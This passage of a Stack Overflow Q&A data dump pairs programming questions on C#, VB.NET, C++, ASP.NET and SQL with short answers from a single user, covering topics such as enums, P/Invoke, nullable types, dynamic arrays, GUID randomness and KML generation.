        Public Shared ReadOnly ServiceNotCovered As String = ""SNCV""
        Public Shared ReadOnly MemberNotEligible As String = ""MNEL""
        'And so forth...
    End Class

End Class

'Calling method
Public Sub ProcessInput()
    Dim obj As New MyClass()
    Select Case obj.ReasonCode
        Case MyClass.ReasonCodeEnum.ServiceNotCovered
            'Do one thing
        Case MyClass.ReasonCodeEnum.MemberNotEligible
            'Do something different
        'Other enum value cases and default
    End Select
End Sub
</code></pre>

<p>In the example above, it would be nice if I could define <code>MyClass.ReasonCode</code> as having type <code>ReasonCodeEnum</code>, but then I'd have to make <code>ReasonCodeEnum</code> a nonstatic class and give it a way of setting and returning a value.</p>

<p>What I'm wondering is whether there's a way to use the built-in Enum functionality to do what I'm doing, or if not, are there any standard design patterns for this type of thing.</p>
","33708","","<p>You could put the strings in a dictionary and find the equivalent <code>enum</code> value, rather than a large <code>Select Case</code> statement:</p>

<pre><code>Public Enum ReasonCode
    ServiceNotCovered
    MemberNotEligible
End Enum


Private mapping As New Dictionary(Of String, ReasonCode)
' Add the required mappings and look up the dictionary...
</code></pre>
"
"<p>is it possible to call C++ code, possibly compiled as a code library file (.dll), from within a .NET language such as C#?</p>

<p>Specifically, C++ code such as the RakNet networking library </p>
","33708","","<p>I'm not familiar with the library you mentioned, but in general there are a couple ways to do so:</p>

<ul>
<li><a href=""http://msdn.microsoft.com/en-us/library/aa288468.aspx"">P/Invoke</a> to exported library functions</li>
<li>Adding a reference to the COM type library (in case you're dealing with COM objects).</li>
</ul>
"
"<p>Anyone knows if multiply operator is faster than using the Math.Pow method? Like:</p>

<pre><code>n * n * n
</code></pre>

<p>vs</p>

<pre><code>Math.Pow ( n, 3 )
</code></pre>
","33708","","<p>Basically, you should <strong>benchmark</strong> to see.</p>

<h3>Educated Guesswork (unreliable):</h3>

<p><em>In case it's not optimized to the same thing by some compiler...</em>  </p>

<p>It's very likely that <code>x * x * x</code> is faster than <code>Math.Pow(x, 3)</code> as <code>Math.Pow</code> has to deal with the problem in its general case, dealing with fractional powers and other issues, while <code>x * x * x</code> would just take a couple multiply instructions, so it's very likely to be faster.</p>
"
"<p>If a value type is declared nullable, how should I take precautions for this? I.e. if in the constructor I have:</p>

<pre><code>public Point3 ( Point3 source )
{
    this.X = source.X;
    this.Y = source.Y;
    this.Z = source.Z;
}
</code></pre>

<p>would it fail, if source was null?</p>
","33708","","<p>I don't see the possibility of <code>Point3</code> being <code>null</code> if it's a value type. Don't you miss a question mark? And if you really mean <code>Point3?</code>, then you should access it like:</p>

<pre><code>public Point3 ( Point3? source )
{
    this.X = source.Value.X;
    this.Y = source.Value.Y;
    this.Z = source.Value.Z;
}
</code></pre>

<p>and in this case, the <code>Value</code> property will throw an exception if it's <code>null</code>.</p>
"
"<p>Is there a simple way of creating a std::string out of an const char[] ?</p>

<p>I mean something simpler then:</p>

<pre><code>std::stringstream stream;
stream &lt;&lt; const_char;

std::string string = stream.str();
</code></pre>
","33708","","<pre><code>std::string str = const_char;
</code></pre>
"
"<p>How do i declare a 2d array using new?</p>

<p>Like, for a ""normal"" array I would:</p>

<pre><code>int* ary = new int[Size]
</code></pre>

<p>but</p>

<pre><code>int** ary = new int[sizeY][sizeX]
</code></pre>

<p>a) doesn't work/compile and b) doesn't accomplish what:</p>

<pre><code>int ary[sizeY][sizeX] 
</code></pre>

<p>does.</p>
","33708","","<p>A dynamic 2D array is basically an array of <em>pointers to arrays</em>. You should initialize it using a loop:</p>

<pre><code>int** ary = new int*[sizeX];
for(int i = 0; i &lt; sizeX; ++i)
    ary[i] = new int[sizeY];
</code></pre>

<p>The above, for <code>sizeX = 4</code> and <code>sizeY = 5</code>, would produce the following:</p>

<p><img src=""http://i.stack.imgur.com/M75kn.png"" alt=""enter image description here""></p>
"
"<p>I'm trying to add another restriction on a method within a generic class. Is this possible?</p>

<p>Pseudocode:
<code></p>

<pre><code>public class MyBaseClass&lt;T&gt; where T: class
{
    public IQueryable&lt;T&gt; ShowThisMethod where T: class, IMyInterface
    {
         // stuff.
    }
}
</code></pre>

<p></code></p>

<p>ShowThisMethod should only be available when T is IMyInterface. Also IMyInterface should then give information back (about T) so that I can access properties defined in IMyInterface inside of the method.</p>

<p>Help :)</p>

<p><strong>By the way, this compiles</strong> (and seems ""almost right""):</p>

<p><code></p>

<pre><code>public class MyBaseClass&lt;T&gt; where T: class
{
    public IQueryable&lt;T&gt; ShowThisMethod&lt;T&gt;() where T: class, IMyInterface
    {
        String X = T.MyInterfaceStringProperty;
    }
}
</code></pre>

<p></code></p>

<p><strong>More Information about my goal</strong>:</p>

<p>I'm using a generic base class to access a common property (DateTime ""Time"" property on LINQ object <em>Dinner</em> which is also on <em>Lunch</em>). </p>

<p>Both objects are implementing <strong>ITimeable</strong> which exposes the DateTime property.</p>

<p>In my base class I'd like to have a method Select() which works on IQueryable&amp;ltT> and can automatically filter based on the Time property. Because I'm working off the generic T, the time property is not visible to the base class, unless I tell it that T is implementing <strong>ITimeable</strong>.</p>

<p>I do want the same base class to work for other non-ITimeable objects too, that's why I need the interface restriction on the Select method, and I also need it in order to access the Time property using generics.</p>

<p>Hope that clears the goal :)</p>

<p><strong>P.S. My main concern is not visibility of the method in IntelliSense etc.</strong>. I'd just like to keep my base class working, while being able to access an interface-specified property through generics in it.</p>
","33708","","<p>No, it's not possible. Constraints are defined when they are declared. In this case, the <strong>method is not generic</strong>, the class is (it's a non-generic method of a generic class). So the constraints can be only declared on the class itself.</p>
"
"<p>I have code like this:</p>

<pre><code>class MapIndex
{
private:
    typedef std::map&lt;std::string, MapIndex*&gt; Container;
    Container mapM;

public:
    void add(std::list&lt;std::string&gt;&amp; values)
    {
        if (values.empty()) // sanity check
            return;

        std::string s(*(values.begin()));
        values.erase(values.begin());
        if (values.empty())
            return;

        MapIndex *mi = mapM[s];  // &lt;- question about this line
        if (!mi)
            mi = new MapIndex();
        mi-&gt;add(values);
    }
}
</code></pre>

<p>The main concern I have is whether the mapM[s] expression would return reference to NULL pointer if new item is added to the map? </p>

<p>The <a href=""http://www.sgi.com/tech/stl/Map.html"">SGI docs</a> say this: *data_type&amp; operator[](const key_type&amp; k) 
Returns a reference to the object that is associated with a particular key. If the map does not already contain such an object, operator[] inserts the default object data_type().*</p>

<p>So, my question is whether the insertion of <strong>default object data_type()</strong> will create a NULL pointer, or it could create an invalid pointer pointing somewhere in the memory?</p>
","33708","","<p>It'll create a <code>NULL</code> (0) pointer, which is an invalid pointer anyway :)</p>
"
"<p>I have a scenario inwhich users of a site I am building need the ability to enter some basic information into a webform without having to logon.  The site is being developed with ASP.NET/C# and is using MSSQL 2005 for its relational data.</p>

<p>The users will be sent an email from the site, providing them a unique link to enter the specific information they are required.  The email will be very similar to the style of email we all get when registering for sites such as forums, containing a randomly generated, unique URL paramter specifically pertaining to a single purpose (such as verifying an email address for a forum).</p>

<p>My queries are regarding the secure implementation of this problem.  I was considering using a GUID as the unique identifier, but am unsure of its implications in the security world.</p>

<ol>
<li>Is a GUID sufficiently long enough such that values cannot be easily guessed (or brute-forced over time)?</li>
<li><p>Is .NET's GUID implmentation sufficiently random in the sense that there is an equal chance of generation of all possible values in the ""key space""?</p></li>
<li><p>If using a GUID is an acceptable approach, should the site then redirect to the information via URL rewriting or by associating the information in a datatable with the GUID as a reference?</p></li>
<li><p>Will using a URL rewriting hide the true source of the data?</p></li>
<li><p>Should I consider using TSQL's SELECT NEWID() as the GUID generator over the .NET implementation?</p></li>
<li><p>Am I completely wrong with my approach to this problem?</p></li>
</ol>

<p>Many thanks,</p>

<p>Carl</p>
","33708","","<ol>
<li>Yes, 2<sup>128</sup> is long enough.</li>
<li>No, GUID implementations are designed to generate <strong>unique</strong> GUIDs rather than random ones. You should use a <a href=""http://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator"">cryptographically secure</a> random number generator (e.g. <a href=""http://msdn.microsoft.com/en-us/library/system.security.cryptography.rngcryptoserviceprovider.aspx""><code>RNGCryptoServiceProvider</code></a>) to generate 16 random bytes and initialize a <code>Guid</code> structure with that.</li>
<li>Yes, it's an acceptable approach overall. Both will work.</li>
<li>Yes, if you don't give out any other clues</li>
<li>No, <code>goto 2</code></li>
<li>No, it's pretty OK. You just need to use a cryptographically secure random number generator to generate the GUID.</li>
</ol>
"
"<p>What would be a simple way to store a Byte[] array in XML (using C#) ?</p>
","33708","","<p>Use <code>Convert.ToBase64String(byte[])</code> to convert it to base 64 representation and store the resulting string.</p>

<p>You can get back the <code>byte[]</code> by calling <code>Convert.FromBase64String(string)</code> method.</p>
"
"<p>How do I pass or get parameter values to/from this function pointer:</p>

<pre><code>typedef void(*  CreateCursorBitmapProc )(uchar *bitmapBuffer, uint32 *width, uint32 *height, bool16 *hasAlpha)
</code></pre>

<p>bitmapBuffer, width, height, hasalpha are the out parameters.</p>
","33708","","<pre><code>// Grab an instance from somewhere...
CreateCursorBitmapProc instance = ...;

// Declare output variables
// should be initialized to some buffer, probably
uchar *bitmapBuffer = new uchar[size_of_buffer]; 
uint32 width, height;
bool16 hasAlpha;
(*instance)(bitmapBuffer, &amp;width, &amp;height, &amp;hasAlpha);
</code></pre>
"
"<p>I'm trying to create a VB.net application which reads each line from an XML-file (or ini file, doesn't matter) which dictates what the name of a string should be. </p>

<p>E.g </p>

<pre><code>""string1 = xml.line1""
""string2 = xml.line2""
</code></pre>

<p>etc</p>

<p>What would be the best approach of doing this?
I've already pluckered a bit with Xml.XmlTextReader and it seems to do the job, but I can't manage to break down each line as it's own string?</p>
","33708","","<p>If you are dealing with the XML line by line and want to ignore XML semantics you should treat it as a plain text file and run a regular expression or something on each line:</p>

<pre><code>Dim lines = File.GetAllLines(""file.xml"")
' Check the lines (which is a String array) for the criteria
</code></pre>
"
"<p>Here is my shortened abstract class:</p>

<pre><code>abstract class Report {

    protected internal abstract string[] Headers { get; protected set; }
}
</code></pre>

<p>Here is a derived class:</p>

<pre><code>class OnlineStatusReport : Report {

    static string[] headers = new string[] {
        ""Time"",
        ""Message""
    }

    protected internal override string[] Headers {
        get { return headers; }
        protected set { headers = value; }
    }

    internal OnlineStatusReport() {
        Headers = headers;
    }
}
</code></pre>

<p>The idea is, I want to be able to be able to call Report.Headers from anywhere in the assembly, but only allow it to be set by derived classes.  I tried making Headers just internal, but protected does not count as more restrictive than internal.  Is there a way to make Headers internal and its set accessor protected AND internal?</p>

<p>I feel like I'm grossly misusing access modifiers, so any design help would be greatly appreciate.</p>
","33708","","<p>It's not possible in C#.</p>

<p>Just for the sake of completeness, this is supported in IL (family and assembly access modifier).</p>
"
"<p>What would happen if you call Close() on a SqlConnection object before you call Close() on a SqlDataReader using that connection?</p>

<p>Actually, what I really want to know is whether or not the order in which you Close them matters.  Does calling SqlConnection.Close() completely close the connection, or will it remain open if you do not call Close() on a SqlDataReader using that connection?</p>

<p>Sorry for the multiple questions, but I don't think I really understand how connection closing works.</p>
","33708","","<p>It'll close the connection (returns it to the pool) and <code>SqlDataReader</code> would throw an exception (<code>System.InvalidOperationException</code>) in case it's used afterward.</p>
"
"<p>Hi I'm developing a .Net application and I want to achieve the following:</p>

<p>I have a winforms application, and a timer (System.Timers.timer) that excecutes a thread based on a schedule. The problem is that I cannot access the UI (windows form) from the secondary thread (WorkerThread), the error say something like the component cannot be accessed from a thread that didn't create it.</p>

<p>Is there any way to achieve this? </p>

<p>Thanks!</p>
","33708","","<pre><code> formObject.Invoke(delegate { 
      // action to perform on UI thread
 });
</code></pre>
"
"<p>I created an OnPaint event of my button,which I lately tried to override,but I failed</p>

<p>My code:</p>

<pre><code>    protected override void button1_Paint(PaintEventArgs e)
    {
    }
</code></pre>

<p>I get this error: ""no suitable method found to override"".</p>

<p>What should I do to make the error dissapear,but keep the method as override?</p>
","33708","","<p>You should declare the method in the base class as <code>virtual</code> in order to be able to override it.</p>
"
"<p>Suppose I want to write a function like the following (as usual, a trivial example for illustrative purposes):</p>

<pre><code>Public Function calcSqSum(Of T)(ByVal list As IEnumerable(Of T)) As T
    Dim sumSq As T

    For Each item As T In list
        sumSq += (item * item)
    Next

    Return sumSq
End Function
</code></pre>

<p>As you can probably guess, this function causes an error because a generic object is not guaranteed to implement the + operator. As far as I know, though, any numerical type (Integer, Double, Decimal, etc.) will.</p>

<p>Is there a way to write a (quasi-)generic function that can accept any <strong>numerical</strong> type, without having to explicitly overload the function for every such type yourself?</p>

<p>Alternatively, I suppose an equally acceptable solution would be to somehow check if a type implements the '+' operator (or any operator generally associated with numerical types and used by the function).</p>
","33708","","<p>No, since there's no specific common interface that all of them implement. In essence, there's no real notion of ""numerical types"" in the framework. Unless you wrap them in self-defined classes and have your method accept only your types (which is not really a direct answer to your question, just a workaround).</p>
"
"<p>If you have  custom type, and you wish to assign a List(of T) to that custom type, how do you do so in vb? I found a C# example as below</p>

<pre><code>List&lt;myclass&gt; result = (from c in db.Customers where c.orders.count &gt; 1 Select new Myclass
{
Id = c.customerID,
Name = c.contactname
}).Tolist();
</code></pre>

<p>From this site <a href=""http://blogs.msdn.com/swiss_dpe_team/archive/2008/01/25/using-your-own-defined-type-in-a-linq-query-expression.aspx"" rel=""nofollow"">http://blogs.msdn.com/swiss_dpe_team/archive/2008/01/25/using-your-own-defined-type-in-a-linq-query-expression.aspx</a></p>

<p>But I am stuck trying to get it to work in Vb.net</p>
","33708","","<pre><code>Dim result = (From c in db.Customers _ 
              Where c.orders.Count &gt; 1 _
              Select new Myclass With { _
              {
                 .Id = c.customerID, _
                 .Name = c.contactname _
              }).ToList()
</code></pre>
"
"<p>How do you check if a pointer is of a certain type?</p>

<p>Using <code>sizeof</code> is not sufficient.</p>

<p>I am trying to avoid putting id-numbers into my structs to identify their type. The assumption is that maybe gcc puts a struct definition somewhere in the process, and maps the definition to the allocated memory at a pointer. If this is true, I'd think there would be someway to check for a pointers type.</p>
","33708","","<p><strong>You can't.</strong> </p>

<p>A pointer merely stores an address and nothing related to the contents of that address.</p>
"
"<p>Consider following example:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;inttypes.h&gt;

struct A {
        uint32_t i1;
        uint32_t i2;
        uint32_t i3;
        uint64_t i4;
        uint32_t i5;
        uint32_t i6;
        uint32_t i7;
        uint64_t i8;
        uint32_t i9;
};

struct B {
        uint32_t i1;
        uint32_t i2;
        uint32_t i3;
        uint32_t i4;
        uint32_t i5;
        uint32_t i6;
        uint32_t i7;
        uint64_t i8;
        uint64_t i9;
};

int
main()
{
        struct A a;
        struct B b;

        printf(""sizeof(a) = %u, sizeof(b) = %u\n"", sizeof(a), sizeof(b));

        return 0;
}
</code></pre>

<p>Output is:</p>

<pre><code>$ ./t2 
sizeof(a) = 56, sizeof(b) = 48
$
</code></pre>

<p>Why are they differ on 64bit machine ? On 32 bit platform results are the same:</p>

<pre><code>$ ./t2
sizeof(a) = 44, sizeof(b) = 44
</code></pre>
","33708","","<p>The compiler aligns the struct members by a boundary (which is different in your compilation attempts).</p>

<p>Add a </p>

<pre><code>#pragma pack (1)
</code></pre>

<p>directive at the beginning of source file and retry.</p>
"
"<p>How do I generate and return a KML document directly to the browser without writing a temporary file to the server or relying on a 3rd party library or class?</p>
","33708","","<p>I suggest you consider using an HTTP Handler instead of a ASP.NET page. It will be cleaner and more performant. Just add new item of type ""Generic Handler"" to your project and consider moving the code to its <code>ProcessRequest</code> method. The general approach is good, though.</p>

<p>By the way, unless you are explicitly mapping <code>.kml</code> files to an ASP.NET handler, it'll not run anyway. I suggest going with the default <code>.ashx</code> extension and add a <code>Content-Disposition</code> HTTP header to set the filename for the client: </p>

<pre><code>Response.AddHeader(""Content-Disposition"", ""attachment; filename=File.kml"");
</code></pre>

<p>Also, note that you should set header stuff <strong>before</strong> anything is sent to the client so you should move setting <code>Content-Type</code> and adding header before other stuff.</p>

<hr>

<p>Full Solution (From the OP):</p>

<p>Here's how I did it:</p>

<h3>Server</h3>

<ol>
<li>Add the .kml mimetype to the folder where you want this ""file"" to live. Say, <code>\\myDevServer\...\InetPub\KML</code><br>
(<a href=""http://code.google.com/apis/kml/documentation/kml_tut.html#kml_server"" rel=""nofollow"">Google's instructions are only for Apache</a>)
<ol>
<li>Open <code>Internet Information Services (IIS) Manager</code> on your DEV server</li>
<li>Navigate to your DEV site</li>
<li>Right-click the <code>KML</code> folder and choose <code>Properties</code></li>
<li>Click the <code>HTTP Headers</code> tab</li>
<li>Click the <code>MIME types</code> button</li>
<li>Click <code>New</code></li>
<li>Enter
<ul>
<li>Extension: .kml</li>
<li>MIME Type: application/vnd.google-earth.kml+xml</li>
</ul></li>
<li>Click <code>OK</code> twice to get back to the <code>HTTP Headers</code> tab</li>
</ol></li>
<li>Set the <code>KML</code> folder as an ASP.NET application (maybe optional depending on how your server is set up)
<ol>
<li>Click the <code>Directory</code> tab</li>
<li>Click the <code>Create</code> button</li>
<li>The <code>Application name</code> field becomes active with the setting <code>KML</code></li>
<li>Click <code>OK</code> taking you back to the main IIS Manager window</li>
</ol></li>
</ol>

<h3>Website</h3>

<ol>
<li>Open VS2008:
<ol>
<li>File >> New Website</li>
<li>Choose:
<ul>
<li><code>Empty Web Site</code></li>
<li>Language: <code>C#</code></li>
<li>Location: <code>\\myDevServer\...\InetPub\KML\</code></li>
</ul></li>
</ol></li>
<li>In <code>Solution Explorer</code>
<ol>
<li>Rightclick the website</li>
<li>Choose <code>New Item</code></li>
<li>Choose <code>Generic Handler</code> from the <code>Visual Studio installed templates</code> window</li>
<li>Enter a name (I used <code>MelroseVista.ashx</code> )</li>
<li>Choose Language: <code>Visual C#</code></li>
<li>Click <code>OK</code></li>
</ol></li>
<li>Paste the following code</li>
</ol>

<p>//</p>

<pre><code>using System;
using System.Web;
using System.Xml;

public class Handler : IHttpHandler
{
    public void ProcessRequest( HttpContext context)
    {
        context.Response.ContentType = ""application/vnd.google-earth.kml+xml"";
        context.Response.AddHeader(""Content-Disposition"", ""attachment; filename=MelroseVista.kml"");

        XmlTextWriter kml = new XmlTextWriter(context.Response.OutputStream, System.Text.Encoding.UTF8);

        kml.Formatting = Formatting.Indented;
        kml.Indentation = 3;

        kml.WriteStartDocument();

        kml.WriteStartElement(""kml"", ""http://www.opengis.net/kml/2.2"");
        kml.WriteStartElement(""Placemark"");
        kml.WriteElementString(""name"", ""Melrose Vista   FL"");
        kml.WriteElementString(""description"", ""A nice little town"");

        kml.WriteStartElement(""Point"");

        kml.WriteElementString(""coordinates"", ""-80.18451400000000000000,26.08816400000000000000,0"");

        kml.WriteEndElement(); // &lt;Point&gt;
        kml.WriteEndElement(); // &lt;Placemark&gt;
        kml.WriteEndDocument(); // &lt;kml&gt;

        kml.Close();

    }
    public bool IsReusable
    {
        get
        {
            return false;
        }
    }
}
</code></pre>

<ol>
<li>Attempt to load your page in your favorite browser</li>
<li>You <em>should</em> get a popup asking you to <code>open</code> or <code>save</code> the resulting KML file.</li>
<li>If you <code>open</code> it, you <em>should</em> have GoogleEarth launch itself and zoom to a thumbtack in Eastern Florida</li>
<li>If you <code>save</code> it, you <em>should</em> see the following in the file</li>
</ol>

<p>\      </p>

<pre><code>&lt;?xml version=""1.0"" encoding=""utf-8""?&gt;
&lt;kml xmlns=""http://www.opengis.net/kml/2.2""&gt;
   &lt;Placemark&gt;
      &lt;name&gt;Melrose Vista   FL&lt;/name&gt;
      &lt;description&gt;A nice little town&lt;/description&gt;
      &lt;Point&gt;
         &lt;coordinates&gt;-80.18451400000000000000,26.08816400000000000000,0&lt;/coordinates&gt;
      &lt;/Point&gt;
   &lt;/Placemark&gt;
&lt;/kml&gt;
</code></pre>

<p>Note: <code>XmlTextWriter</code> worked pretty well here.  However, I think <code>XMLDocument</code> looks more promising for larger KML files since you can manipulate it in memory before pushing it to the user.  If, for example, you want the same point to appear in multiple folders in the GoogleEarth Locations tree.</p>
"
"<p>I am using the <code>Array.Contains</code> method on a string array. How can I make that case-insensitive?</p>
","33708","","<pre><code>array.Contains(""str"", StringComparer.OrdinalIgnoreCase);
</code></pre>

<p>Or depending on the specific circumstance, you might prefer:</p>

<pre><code>array.Contains(""str"", StringComparer.CurrentCultureIgnoreCase);
array.Contains(""str"", StringComparer.InvariantCultureIgnoreCase);
</code></pre>
"
"<p>How do I alter the contents of an IDictionary using C# 3.0 (Linq, Linq extensions) ?</p>

<pre><code>var enumerable = new int [] { 1, 2};
var dictionary = enumerable.ToDictionary(a=&gt;a,a=&gt;0);
//some code
//now I want to change all values to 1 without recreating the dictionary
//how it is done?
</code></pre>
","33708","","<pre><code>foreach (var item in dictionary.Keys)
    dictionary[item] = 1;
</code></pre>

<p>I wonder why you might a need doing such a thing, though.</p>
"
"<p>Can you explain why example #1 fails with ""No Translation to SQL"" and example #2 works fine?</p>

<p>All in Repository:</p>

<p><strong>EX#1:</strong></p>

<pre><code>public DomainPerson GetBestPerson()
{       
       var person= GetPeople().Where(p=&gt;p.Quality==""Best"").SingleOrDefault();
       return person;
}

public IQueryable&lt;DomainPerson&gt; GetPeople()
{
       var people= from p in Data.Persons
                   select MapToDomain(p);

       return people;
}

private DomainPerson MapToDomain(Data.Person dataPerson)
{   
       DomainPerson domainPerson= new DomainPerson{
                                  Id=dataPerson.Id,
                                  Name=dataPerson.Name,
                                  Quality=dataPerson.Quality,
                                  };
       return domainPerson;
}
</code></pre>

<p><strong>EX#2</strong></p>

<pre><code> public DomainPerson GetBestPerson()
{       
       var person= GetPeople().Where(p=&gt;p.Quality==""Best"").SingleOrDefault();
       return person;
}

public IQueryable&lt;DomainPerson&gt; GetPeople()
{
       var people= from p in Data.Persons
                   select new DomainPerson{
                   Id=dataPerson.Id,
                   Name=dataPerson.Name,
                   Quality=dataPerson.Quality,
                   };


       return people;
}
</code></pre>
","33708","","<p>The reason is LINQ to SQL works by translating <strong>expression trees</strong> (<code>Expression&lt;Func&lt;T&gt;&gt;</code>) to SQL and running it on the server. The method you're referencing in #1 is compiled down to IL. LINQ to SQL can't grab an expression tree representation from its body.</p>

<p>The second example is not really compiled down to IL. It's stored at data that can be read and translated at run time. <a href=""http://stackoverflow.com/questions/767733/converting-a-net-funct-to-a-net-expressionfunct"">My answer for this question</a> explains this in detail.</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br />
  <a href=""http://stackoverflow.com/questions/702234/what-is-the-difference-between-the-following-casts-in-c"">What is the difference between the following casts in c#?</a>  </p>
</blockquote>

<p>In C#, is a there difference between casting an object or using the <code>as</code> keyword? Hopefully this code will illustrate what I mean...</p>

<pre><code>String text = ""Hello hello"";
Object obj = text; 

String originalCast = ((String)obj).ToUpper();
String originalAs = (obj as String).ToUpper();
</code></pre>

<p>Thanks</p>

<p><strong>:)</strong></p>
","33708","","<p>Other than <code>InvalidCastException</code> that's already mentioned...</p>

<p><code>as</code> will not work if the target type is a value type (unless it's nullable):</p>

<pre><code>obj as int // compile time error.
</code></pre>
"
"<p>I have an IEnumerable list of objects in C#. I can use a for each to loop through and examine each object fine, however in this case all I want to do is examine the first object is there a way to do this without using a foreach loop?</p>

<p>I've tried mylist[0] but that didnt work.</p>

<p>Thanks</p>
","33708","","<p>If you're not on 3.5:</p>

<pre><code> using (IEnumerator&lt;Type&gt; ie = ((IEnumerable&lt;Type&gt;)myList).GetEnumerator()) {
     if (ie.MoveNext())
         value = ie.Current;
     else
         // doesn't exist...
 }
</code></pre>

<p>or</p>

<pre><code> Type value = null;
 foreach(Type t in myList) {
     value = t;
     break;
 }
</code></pre>
"
"<p>I want to change sender PAGE URL to anything in my website. </p>

<p>For example I have a webpage named ""DEFAULT.ASPX"" thats got a Form tag  action=""http://otherpage.aspx"". When I submit the form it's sending my values that are in the form to otherpage.aspx. This page is getting them and does its work.</p>

<p>But otherpage.aspx is looking for sender page url and see in there! Its DEFAULT.ASPX (my page thats got form in it ) . I want to change my page url thats got form to ""YOUCANTSEEMYREALPAGENAME.ASPX"" .. </p>

<p>WHY I NEED THIS...
There is a site that I want to link to. I have linked but if my URL is not ""yrmypage.aspx"" it's not working properly. So I need to hide my real page url and change it to yrmypage.aspx :)</p>
","33708","","<p>The referrer is set by the browser. You cannot change it unless you are making the request from the server, yourself (in which case, you are essentially ""the browser"").</p>
"
"<p>Normally when you add a new assembly you have to go into Visual Studio and add a reference (the .dll is stored in the /bin directory).</p>

<p>Since this website compiles on the fly, is it possible for me to just add the .dll to the live website, and then use that .dll in an .aspx page?</p>

<p>Currently in Visual Studio I can't see the .dll unless I go to 'add reference'.</p>
","33708","","<p>Yes, it's perfectly possible to change the DLL on the live Web site. Just swapping the DLL in the <code>/bin</code> directory will make the application bind to the new one. However, Visual Studio needs the DLL to exist at development time to provide IntelliSense and validate the Web site. </p>
"
"<p>Might seem like a bizarre request, but is there anyway to run .NET apps on a locked down machine without installing the runtime? If a set of my users is going to working on machines that are totally locked down, no .NET runtime and no way to install it, is there anyway to 'host' the runtime? </p>

<p>I was thinking along the lines of portable usb apps or something?</p>

<p>Anyone have any ideas here?</p>
","33708","","<p>You might consider using <a href=""http://mono-project.com"" rel=""nofollow"">Mono</a>. It'll work with a local, private copy.</p>
"
"<p>In just about any formally structured set of information, you start reading either from the start towards the end, or occasionally from the end towards the beginning (street addresses, for example.)  But in SQL, especially SELECT queries, in order to properly understand its meaning you have to start in the middle, at the FROM clause.  This can make long queries very difficult to read, especially if it contains nested SELECT queries.</p>

<p>Usually in programming, when something doesn't seem to make any sense, there's a historical reason behind it.  Starting with the SELECT instead of the FROM doesn't make sense.  Does anyone know the reason it's done that way?</p>
","33708","","<p>It's designed to be English like. I think that's the primary reason.</p>

<p>As a side note, I remember the initial previews of LINQ were directly modeled after it (<code>select ... from ...</code>). This was changed in later previews to be more programming language like (so that the scope goes downwards). Anders Hejlsberg specifically mentioned this weird fact about SQL (which makes IntelliSense harder and doesn't match C# scope rules) as the reason they made this decision.</p>

<p>Anyhow, good or bad, it's what it is and it's too late to change anything. </p>
"
"<p>I have a master page which a generic a menu that looks like this:</p>

<pre><code>&lt;div id=""menu""&gt;
&lt;ul class=""sf-menu""&gt;
	&lt;li class=""menuHome""&gt;&lt;a href=""/home""&gt;Home&lt;/a&gt;&lt;/li&gt;
	&lt;li class=""menuBandsAZ""&gt;&lt;a href=""/artist/list""&gt;Bands&lt;/a&gt;&lt;/li&gt;
	&lt;li class=""menuGigs""&gt;&lt;a href=""/gig/list""&gt;Gigs&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
&lt;/div&gt;
&lt;asp:ContentPlaceHolder ID=""ListingPlaceHolder"" runat=""server""&gt;&lt;/asp:ContentPlaceHolder&gt;
</code></pre>

<p>I want to apply a css class to the <strong>body</strong> element defined in the masterpage so that I can highlight the menu item which represents the page the user is viewing.</p>

<p>How would you guys suggest I do this?</p>

<p>Since I'm using asp.net MVC I <strong>could</strong> adding a <em>""section"" property</em> to my BaseViewModel which the Masterpage could use to determine which css class to apply to the body element.</p>

<p>However, I'd prefer to be able to specify in the views which section they represent since it may be easier to maintain imo.</p>

<p>Any suggestions? </p>
","33708","","<p>I'd put the menu in a user control, in each page, I'd render the user control with a model representing the selected item. The user control will render the menu appropriately by looking at the model passed to it.</p>
"
"<p>I'm trying to figure this part of C out.  I've read some tutorials given to me but I haven't found it yet.</p>

<p>Trying to read libraries I see that there are .c and .h files of the same name.  In the main sourcethe .h file is included but not the .c file.  When I look at the code in the .h file it also doesn't #include the .c file of the same name.  Am I missing something?  Does the compiler automatically include a  .c file when a .h file of the same name is #include'd?</p>
","33708","","<p>No. There's no need to include .c files in .h files. .h files are not normally passed as compiler input directly but their sole purpose is to be included by other files.</p>

<p>Usually, it's something like:</p>

<pre><code>""a.c""    includes   ""a.h""
""b.c""    includes   ""c.h""
</code></pre>

<p>You compile ""a.c"" and ""b.c"" and link the output files.</p>
"
"<p>In Java and C#, they both have something like System.terminate(). If my program has open database connections, database readers, and database command variables, and I terminate my program in a catch clause, will database resources still remain in use? or will they be freed automatically since my entire program has just exited?</p>

<p>Normally, how should I handle such cases to make sure I always free database connections, whether through normal program termination or unexpected program termination? Any good practices?</p>
","33708","","<p>Upon termination of a process, all associated resources (incl. memory, handles, connections, ...) will be freed up.</p>

<p>Normally, in C#, you'll use the Dispose pattern/<code>using</code> statement to control scarce resources.</p>
"
"<p>I have a web application which contains a virtual directory for videos. When ever user uploads a videos my automated programe creates mp4 version of that file. My virtual directory is using integrated windows auth. and my .wmv and .mp4 files are in the same folder.</p>

<p>When i am trying to access .mp4 version of the video it is showing me this error.</p>

<pre><code>""HTTP Error 401.3 - Unauthorized: Access is denied due to an ACL set on the    requested resource.""
</code></pre>

<p>At the same time when i access the .wmv file format it is working fine. can any one help me with this.</p>

<p>thanks</p>
","33708","","<p>Add a MIME type for <code>.mp4</code> extension in IIS configuration. I <em>think</em> that's the problem.</p>
"
"<p>Before C# 3.0 we done like this:</p>

<pre><code>class SampleClass
{
   private int field;
   public int Property { get { return this.field } set { this.field = value } }
}
</code></pre>

<p>Now we do this:</p>

<pre><code>class SampleClass
{
   public int Property { get; set; }
}
</code></pre>

<p>(Look ma! no fields!)
Now if I want to customize the Getter or the Setter, the field must be explicit as it was in C#2.0?</p>
","33708","","<p>Yes, that's the only way. No shortcut for customization (other than access modifiers).</p>
"
"<p>I would like to do some japanese text to speech on my dedicated windows 2003 x64 server with .net framework, using c#
I found something on google, but requires to install a lot of files on the server... i don't like, for stability issues: there is another option, like a linked dll or something?</p>
","33708","","<p>You can use <a href=""http://www.microsoft.com/downloads/details.aspx?FamilyID=5e86ec97-40a7-453f-b0ee-6583171b4530&amp;displaylang=en"" rel=""nofollow"">Microsoft Speech SDK</a>. It's a set of COM APIs containing TTS and SR engines. I'm not sure if it contains Japanese TTS though.</p>
"
"<p>I have the following Generic List which is populated with a list of string:  </p>

